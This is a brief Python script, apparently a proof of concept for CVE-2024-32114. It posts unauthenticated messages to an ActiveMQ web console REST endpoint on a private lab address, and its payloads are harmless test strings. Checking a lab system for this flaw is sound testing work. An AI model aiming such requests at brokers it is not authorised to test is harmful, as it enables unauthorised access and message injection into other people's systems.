import requests

def send_message(queue_url, destination, message):
    try:
        headers = {'Content-Type': 'application/json'}
        data = {
            "type": "queue",
            "destinationName": destination,
            "body": message
        }
        response = requests.post(f"{queue_url}/api/message?type=queue&destination={destination}", json=data, headers=headers)
        if response.status_code == 204:
            print(f"Message '{message}' sent successfully to {destination}")
        else:
            print(f"Failed to send message '{message}':", response.status_code, response.text)
    except Exception as e:
        print(f"Error while sending message '{message}':", e)

def main():
    queue_url = "http://192.168.56.1:8161"
    destination = "testQueue"
    
    messages = [
        "cve-2024-32114",
        "POC test",
        "jolokia api test",
        "import",
        "message"
    ]
    
    for message in messages:
        send_message(queue_url, destination, message)

if __name__ == "__main__":
    main()
